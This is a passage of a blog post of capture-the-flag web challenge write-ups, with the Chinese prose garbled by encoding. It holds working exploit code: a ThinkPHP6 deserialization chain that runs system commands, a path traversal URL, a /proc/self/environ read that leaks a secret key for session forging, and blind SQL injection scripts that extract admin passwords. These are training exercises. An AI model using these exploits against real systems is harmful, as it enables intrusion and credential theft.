</span></span><span class="line"><span class="cl">            <span class="n">times</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">times</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">str_to_hex</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>glzjin_wants_a_girl_friend.zip</p>
<p>ÂÆ°ËÆ°Ê∫êÁ†ÅÂèëÁé∞listdataËøô‰∏™ÂèòÈáèÂèØÊéßÔºåuserindex.phpÈáåÈù¢ÂèØ‰ª•‰º†ÂÖ•img_fileË∑üflagË∑ØÂæÑÂ∞±ÂèØ‰ª•ËØªÂèñ‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">index.php?r=User/Index&amp;img_file=/../flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÂÆâÊ¥µÊùØ-2019iamthinking">[ÂÆâÊ¥µÊùØ 2019]iamthinking
</h2><p>www.zip‰∏ãËΩΩÊ∫êÁ†Å</p>
<p>thinkphp6ÂèçÂ∫èÂàóÂåñ</p>
<p>ÊúÄÂêé‰∏ÄÊ≠•Ë¶ÅÁî®<code>parse_url</code>ÁöÑÊºèÊ¥ûÂä†<code>//</code>Â∞±Ë°å</p>
<p>pocÂ∑•ÂÖ∑https://github.com/wh1t3p1g/phpggc</p>
<p>Âà©Áî®Èìæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">think\Model --&gt; __destruct()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\Model --&gt; save()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\Model --&gt; updateData()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\Model --&gt; checkAllowFields()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\Model --&gt; db()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ÂêéÂçäÈÉ®ÂàÜÂà©Áî®ÈìæÔºàÂêåtp 5.2ÂêéÂçäÈÉ®ÂàÜÂà©Áî®Èìæ)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\model\concern\Conversion --&gt; __toString()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\model\concern\Conversion --&gt; __toJson()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\model\concern\Conversion --&gt; __toArray()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\model\concern\Attribute --&gt; getAttr()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\model\concern\Attribute --&gt; getValue()
</span></span></code></pre></td></tr></table>
</div>
</div><p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model\concern</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">trait</span> <span class="nx">Conversion</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">trait</span> <span class="nx">Attribute</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$withAttr</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;xxx&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;system&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;xxx&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;cat /flag&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">abstract</span> <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">model\concern\Attribute</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">model\concern\Conversion</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$lazySave</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$withEvent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$exists</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$force</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$field</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$schema</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$table</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazySave</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">withEvent</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exists</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">force</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">field</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">schema</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">think\Model</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pivot</span> <span class="k">extends</span> <span class="nx">Model</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$obj</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">//ÂÆö‰πâthis-&gt;data‰∏ç‰∏∫Á©∫
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">parent</span><span class="o">::</span><span class="na">__construct</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span> <span class="o">=</span> <span class="nv">$obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Pivot</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Pivot</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="paseca2019honey_shop">[PASECA2019]honey_shop
</h2><p>ÂõæÁâáÊúâ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ</p>
<p>ËØªÂèñproc/self/enviorn</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250508132341354.png"
	width="1870"
	height="700"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250508132341354_hu14708797881950797707.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250508132341354_hu5360137006694515489.png 1024w"
	loading="lazy"
	
		alt="image-20250508132341354"
	
	
		class="gallery-image" 
		data-flex-grow="267"
		data-flex-basis="641px"
	
></p>
<p>ËØªÂà∞secretkey‰º™ÈÄ†session</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">F5SmhLBQtsPYGpBRZxe56E0Nwk7LJ369gSI2Kl4h
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250508132836287.png"
	width="1457"
	height="215"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250508132836287_hu433010948157011271.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250508132836287_hu11182845493991691577.png 1024w"
	loading="lazy"
	
		alt="image-20250508132836287"
	
	
		class="gallery-image" 
		data-flex-grow="677"
		data-flex-basis="1626px"
	
></p>
<h2 id="black-watch-ÂÖ•Áæ§È¢òweb">[Black Watch ÂÖ•Áæ§È¢ò]Web
</h2><p>Áõ≤Ê≥®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Êü•Â∫ìÂêç</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;1^(ascii(substr((select(database())),</span><span class="si">{}</span><span class="s1">,1))&gt;</span><span class="si">{}</span><span class="s1">)^1&#39;</span>    <span class="c1">#Â∫ìÂêç‰∏∫news</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#Êü•Ë°®Âêç</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=</span><span class="se">\&#39;</span><span class="s1">news</span><span class="se">\&#39;</span><span class="s1">)),</span><span class="si">{}</span><span class="s1">,1))&gt;</span><span class="si">{}</span><span class="s1">)^1&#39;</span> <span class="c1">#Ë°®Âêç‰∏∫admin,contents</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#Êü•Â≠óÊÆµ</span>
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="s1">&#39;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=</span><span class="se">\&#39;</span><span class="s1">contents</span><span class="se">\&#39;</span><span class="s1">)),</span><span class="si">{}</span><span class="s1">,1))&gt;</span><span class="si">{}</span><span class="s1">)^1&#39;</span>   <span class="c1">#adminË°®ÈáåÊúâid,username,password,is_enable</span>
</span></span><span class="line"><span class="cl">                                                                                                                                              <span class="c1"># contentsË°®ÈáåÊúâid,title,content,is_enable</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#Êü•Â≠óÊÆµÂÄº</span>
</span></span><span class="line"><span class="cl"><span class="n">payload4</span> <span class="o">=</span> <span class="s1">&#39;1^(ascii(substr((select(group_concat(password))from(admin)),</span><span class="si">{}</span><span class="s1">,1))&gt;</span><span class="si">{}</span><span class="s1">)^1&#39;</span>    <span class="c1">#ÂàÜÂà´Êü•usernameÂíåpassword</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">low</span> <span class="o">=</span><span class="mi">28</span>
</span></span><span class="line"><span class="cl">    <span class="n">high</span> <span class="o">=</span><span class="mi">137</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://f695d102-a73b-4b8a-a546-b63ea583f09f.node5.buuoj.cn:81/backend/content_detail.php?id=&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload4</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span><span class="o">+=</span><span class="n">payload</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Êú≠Â∏àÂÇÖÁº∫‰∏™Â•≥ÊúãÂèã&#34;</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="googlectf2019-qualsbnv">[GoogleCTF2019 Quals]Bnv
</h2>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E5%88%B7%E9%A2%98/">Âà∑È¢ò</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under 9u_l3</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Áõ∏ÂÖ≥ÊñáÁ´†</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/xctf%E5%88%B7%E9%A2%98/">
        
        
            <div class="article-image">
                <img src="/p/xctf%E5%88%B7%E9%A2%98/1.b6981e26e3ff7be7ee3895b83dbe93a1.jpg" 
                        width="5416" 
                        height="2894" 
                        loading="lazy"
                        alt="Featured image of post xctfÂà∑È¢ò"
                        
                        data-hash="md5-tpgeJuP/e&#43;fuOJW4Pb6ToQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">xctfÂà∑È¢ò</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/">
        
        
            <div class="article-image">
                <img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/1.36b7be2aa84abef312bd7b8ca3fd18f0.png" 
                        width="1216" 
                        height="832" 
                        loading="lazy"
                        alt="Featured image of post ÁéÑÊú∫ÊâìÈù∂Êó•ËÆ∞"
                        
                        data-hash="md5-Nre&#43;KqhKvvMSvXuMo/0Y8A==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ÁéÑÊú∫ÊâìÈù∂Êó•ËÆ∞</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/thm%E6%97%A5%E8%AE%B0/">
        
        
            <div class="article-image">
                <img src="/p/thm%E6%97%A5%E8%AE%B0/1.c45bccdc896ea1f57e891c02d54ef513.png" 
                        width="2048" 
                        height="1536" 
                        loading="lazy"
                        alt="Featured image of post thmÊó•ËÆ∞"
                        
                        data-hash="md5-xFvM3IluofV&#43;iRwC1U71Ew==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">thmÊó•ËÆ∞</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Êó†ÊïåÂèØÁà±ÁæéÂíïÂôú
    </section>
    
    <section class="powerby">
        ‰ΩøÁî® <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> ÊûÑÂª∫ <br />
        ‰∏ªÈ¢ò <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> Áî± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> ËÆæËÆ°
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

